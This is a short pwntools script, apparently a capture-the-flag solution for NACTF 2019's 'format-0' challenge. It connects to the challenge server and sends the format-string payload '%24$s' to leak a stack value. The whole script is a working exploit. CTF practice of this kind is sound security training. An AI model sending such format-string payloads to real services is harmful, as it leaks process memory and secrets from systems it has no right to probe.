#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

# context(log_level="debug", arch="i386", os="linux")
# p = process('./format-0')
p = remote('shell.2019.nactf.com', 31782)
# gdb.attach(p, "b *0x080491F6\nc\nsi")

pd = '%24$s'
p.sendline(pd)
p.recvuntil('You typed: ')
p.interactive()
